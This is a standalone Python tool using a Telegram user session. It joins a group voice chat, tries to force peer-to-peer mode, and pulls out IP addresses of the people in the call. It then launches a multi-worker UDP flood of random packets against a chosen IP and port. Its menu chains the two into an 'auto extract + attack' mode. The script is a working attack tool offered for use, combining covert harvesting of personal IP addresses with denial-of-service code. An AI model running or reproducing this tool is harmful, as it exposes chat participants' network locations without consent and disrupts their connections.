"""
STANDALONE - Pyrogram Session Only VC IP Extractor + Attack
NO BOT NEEDED - Just run with session string
"""

import asyncio
import json
import logging
import os
import re
import socket
import sys
import time
from dataclasses import dataclass
from typing import Any, Optional, List

from pyrogram import Client
from pyrogram.errors import ChatAdminRequired, FloodWait, UserAlreadyParticipant
from pyrogram.raw import functions, types

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
LOGGER = logging.getLogger(__name__)

# Config from env
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
SESSION_STRING = os.getenv("SESSION_STRING", "")

@dataclass
class VCConnectionInfo:
    ip: str
    port: int
    type: str
    raw: str


class VCExtractor:
    def __init__(self, session_string: str, api_id: int, api_hash: str):
        self.client = Client(
            "vc_extractor",
            api_id=api_id,
            api_hash=api_hash,
            session_string=session_string,
            workdir="/tmp"
        )
        self.extracted_ips: List[VCConnectionInfo] = []
        
    async def start(self):
        await self.client.start()
        LOGGER.info("✅ Session started successfully!")
        
    async def stop(self):
        await self.client.stop()
        
    async def scan_and_extract(self, chat_id: int):
        """Scan specific chat for VC and extract IPs"""
        LOGGER.info(f"🔍 Scanning chat {chat_id}...")
        
        try:
            peer = await self.client.resolve_peer(chat_id)
            call = await self._get_call(peer)
            
            if not call:
                LOGGER.error("❌ No active voice chat found in this chat!")
                LOGGER.info("💡 Start a voice chat first, then run again.")
                return None
                
            LOGGER.info(f"✅ Found active VC! Call ID: {call.id}")
            
            # Join and extract
            metadata = await self._join_and_extract(peer, call, chat_id)
            return metadata
            
        except Exception as e:
            LOGGER.error(f"❌ Error: {e}")
            return None
            
    async def _get_call(self, peer):
        """Get active call from peer"""
        try:
            if isinstance(peer, types.InputPeerChannel):
                full = await self.client.invoke(
                    functions.channels.GetFullChannel(
                        channel=types.InputChannel(channel_id=peer.channel_id, access_hash=peer.access_hash)
                    )
                )
                return getattr(full.full_chat, "call", None)
            elif isinstance(peer, types.InputPeerChat):
                full = await self.client.invoke(functions.messages.GetFullChat(chat_id=peer.chat_id))
                return getattr(full.full_chat, "call", None)
        except Exception as e:
            LOGGER.error(f"Get call error: {e}")
        return None
        
    async def _join_and_extract(self, peer, call, chat_id):
        """Join VC with P2P forcing and extract all IPs"""
        LOGGER.info("🚀 Attempting to join VC with P2P forcing...")
        
        joined = False
        
        # METHOD 1: Join with P2P params
        try:
            join_params = {
                "ufrag": "extract",
                "pwd": "p2p_mode",
                "fingerprints": [{"hash": "sha-256", "setup": "active", "fingerprint": "00:00:00:00"}],
                "ssrc": 12345678,
                "ice_servers": [],  # Empty = force P2P
                "p2p_allowed": True,
                "bundle": "BUNDLE 0"
            }
            
            await self.client.invoke(
                functions.phone.JoinGroupCall(
                    call=types.InputGroupCall(id=call.id, access_hash=call.access_hash),
                    join_as=peer,
                    params=types.DataJSON(data=json.dumps(join_params)),
                    muted=True,
                    video_stopped=True,
                    invite_hash=None,
                )
            )
            joined = True
            LOGGER.info("✅ Joined VC successfully!")
            await asyncio.sleep(3)
        except UserAlreadyParticipant:
            joined = True
            LOGGER.info("✅ Already in VC")
        except Exception as e:
            LOGGER.warning(f"Join warning: {e}")
            
        # Get detailed call info
        LOGGER.info("📡 Fetching call details...")
        group_call = await self.client.invoke(
            functions.phone.GetGroupCall(
                call=types.InputGroupCall(id=call.id, access_hash=call.access_hash),
                limit=100
            )
        )
        
        call_obj = group_call.call
        self.extracted_ips = []
        
        # DEBUG: Print all call attributes
        LOGGER.info("🔍 DEBUG - Call Object Attributes:")
        for attr in dir(call_obj):
            if not attr.startswith('_') and hasattr(call_obj, attr):
                try:
                    val = getattr(call_obj, attr)
                    if val is not None:
                        LOGGER.info(f"  {attr}: {str(val)[:100]}")
                except:
                    pass
        
        # METHOD 2: Parse params
        params_raw = getattr(call_obj, "params", None)
        if params_raw:
            try:
                params_data = json.loads(getattr(params_raw, "data", "{}"))
                LOGGER.info(f"📄 Params: {json.dumps(params_data, indent=2)[:500]}")
                
                # Extract endpoints
                endpoints = params_data.get("endpoints", [])
                for ep in endpoints:
                    self._add_ip(str(ep), "endpoint")
                    
                # Extract transport
                transport = params_data.get("transport", {})
                for cand in transport.get("candidates", []):
                    ip = cand.get("ip") or cand.get("address")
                    if ip:
                        self._add_ip(f"{ip}:{cand.get('port', 0)}", "candidate")
                        
                # Deep IP extraction
                self._extract_ips_from_json(params_data)
            except Exception as e:
                LOGGER.error(f"Parse error: {e}")
                
        # METHOD 3: Get participants
        participants = list(getattr(group_call, "participants", []))
        LOGGER.info(f"👥 Participants: {len(participants)}")
        
        for p in participants:
            try:
                source = getattr(p, "source", None)
                if source:
                    LOGGER.info(f"  Participant source: {source}")
            except:
                pass
                
        # METHOD 4: Try export
        try:
            export = await self.client.invoke(
                functions.phone.ExportGroupCallInvite(
                    call=types.InputGroupCall(id=call.id, access_hash=call.access_hash)
                )
            )
            LOGGER.info(f"📤 Export: {export}")
        except:
            pass
            
        # Results
        LOGGER.info(f"\n{'='*50}")
        LOGGER.info(f"🎯 EXTRACTION RESULTS")
        LOGGER.info(f"{'='*50}")
        LOGGER.info(f"Total IPs found: {len(self.extracted_ips)}")
        
        if self.extracted_ips:
            for i, ip_info in enumerate(self.extracted_ips[:10], 1):
                LOGGER.info(f"  {i}. {ip_info.ip}:{ip_info.port} ({ip_info.type})")
        else:
            LOGGER.info("  ❌ No IPs extracted")
            LOGGER.info("  💡 Telegram hides real IPs behind relays")
            
        LOGGER.info(f"{'='*50}\n")
        
        return {
            "joined": joined,
            "ips": self.extracted_ips,
            "participants": len(participants)
        }
        
    def _add_ip(self, endpoint: str, ip_type: str):
        """Parse and add IP"""
        if not endpoint:
            return
            
        # Parse IP:PORT
        ip, port = endpoint, 0
        if ":" in endpoint:
            parts = endpoint.rsplit(":", 1)
            try:
                port = int(parts[1])
                ip = parts[0]
            except:
                pass
                
        # Validate IP
        try:
            socket.inet_aton(ip)
            if ip not in ["0.0.0.0", "127.0.0.1"]:
                # Check duplicate
                if not any(x.ip == ip and x.port == port for x in self.extracted_ips):
                    self.extracted_ips.append(VCConnectionInfo(ip, port, ip_type, endpoint))
                    LOGGER.info(f"✅ Found IP: {ip}:{port} ({ip_type})")
        except:
            # Maybe hostname
            if "." in ip and not ip.startswith("http"):
                if not any(x.ip == ip for x in self.extracted_ips):
                    self.extracted_ips.append(VCConnectionInfo(ip, port, f"{ip_type}_host", endpoint))
                    
    def _extract_ips_from_json(self, obj):
        """Recursively find IPs in JSON"""
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str) and self._looks_like_ip(v):
                    self._add_ip(v, "json_field")
                elif isinstance(v, (dict, list)):
                    self._extract_ips_from_json(v)
        elif isinstance(obj, list):
            for item in obj:
                if isinstance(item, str) and self._looks_like_ip(item):
                    self._add_ip(item, "json_array")
                elif isinstance(item, (dict, list)):
                    self._extract_ips_from_json(item)
                    
    def _looks_like_ip(self, s: str) -> bool:
        """Check if string looks like IP"""
        if not s or "://" in s:
            return False
        parts = s.split(".")
        if len(parts) == 4:
            try:
                return all(0 <= int(p) <= 255 for p in parts)
            except:
                pass
        return False
        
    async def attack_target(self, ip: str, port: int, duration: int = 30, threads: int = 50):
        """UDP Attack on target"""
        LOGGER.info(f"🚀 Starting attack on {ip}:{port} for {duration}s...")
        
        import socket as sock
        import os
        import time
        
        stop_event = asyncio.Event()
        stats = {"sent": 0, "failed": 0, "bytes": 0}
        
        # Create payload pool
        payloads = [os.urandom(1200) for _ in range(100)]
        
        async def worker():
            s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
            s.setblocking(False)
            loop = asyncio.get_running_loop()
            idx = 0
            
            while not stop_event.is_set():
                try:
                    data = payloads[idx % len(payloads)]
                    await loop.sock_sendto(s, data, (ip, port))
                    stats["sent"] += 1
                    stats["bytes"] += len(data)
                except:
                    stats["failed"] += 1
                idx += 1
                
        # Start workers
        workers = [asyncio.create_task(worker()) for _ in range(threads)]
        
        # Progress display
        start = time.time()
        try:
            while time.time() - start < duration:
                await asyncio.sleep(2)
                elapsed = time.time() - start
                rps = stats["sent"] / elapsed if elapsed > 0 else 0
                LOGGER.info(f"⏱️ {elapsed:.1f}s | Packets: {stats['sent']} | RPS: {rps:.0f}")
        finally:
            stop_event.set()
            await asyncio.gather(*workers, return_exceptions=True)
            
        elapsed = time.time() - start
        LOGGER.info(f"\n{'='*50}")
        LOGGER.info(f"✅ ATTACK COMPLETE")
        LOGGER.info(f"{'='*50}")
        LOGGER.info(f"Target: {ip}:{port}")
        LOGGER.info(f"Duration: {elapsed:.1f}s")
        LOGGER.info(f"Packets: {stats['sent']}")
        LOGGER.info(f"Failed: {stats['failed']}")
        LOGGER.info(f"Data: {stats['bytes'] / 1024 / 1024:.2f} MB")
        LOGGER.info(f"RPS: {stats['sent'] / elapsed:.0f}")
        LOGGER.info(f"{'='*50}\n")


async def main():
    print("""
╔════════════════════════════════════════════════╗
║   VC IP EXTRACTOR + ATTACK - Session Only      ║
╚════════════════════════════════════════════════╝
""")
    
    if not all([API_ID, API_HASH, SESSION_STRING]):
        print("❌ Missing config! Set these env vars:")
        print("   API_ID, API_HASH, SESSION_STRING")
        return
        
    extractor = VCExtractor(SESSION_STRING, API_ID, API_HASH)
    
    try:
        await extractor.start()
        
        print("\n📋 Menu:")
        print("1. Extract IPs from VC")
        print("2. Attack specific target")
        print("3. Auto extract + attack")
        print("4. Exit")
        
        choice = input("\nChoice (1-4): ").strip()
        
        if choice == "1":
            chat_id = input("Enter chat ID (with - for groups): ").strip()
            chat_id = int(chat_id)
            await extractor.scan_and_extract(chat_id)
            
        elif choice == "2":
            ip = input("Target IP: ").strip()
            port = int(input("Target port: ").strip())
            duration = int(input("Duration (seconds): ").strip())
            threads = int(input("Threads [50]: ").strip() or "50")
            await extractor.attack_target(ip, port, duration, threads)
            
        elif choice == "3":
            chat_id = input("Enter chat ID: ").strip()
            chat_id = int(chat_id)
            result = await extractor.scan_and_extract(chat_id)
            
            if result and result["ips"]:
                print("\n🎯 Extracted IPs:")
                for i, ip_info in enumerate(result["ips"], 1):
                    print(f"  {i}. {ip_info.ip}:{ip_info.port}")
                    
                attack = input("\nAttack first IP? (y/n): ").strip().lower()
                if attack == "y":
                    target = result["ips"][0]
                    duration = int(input("Duration (seconds) [30]: ").strip() or "30")
                    await extractor.attack_target(target.ip, target.port, duration)
            else:
                print("❌ No IPs to attack")
                
    except KeyboardInterrupt:
        print("\n\n🛑 Stopped by user")
    finally:
        await extractor.stop()
        print("👋 Session closed")


if __name__ == "__main__":
    asyncio.run(main())
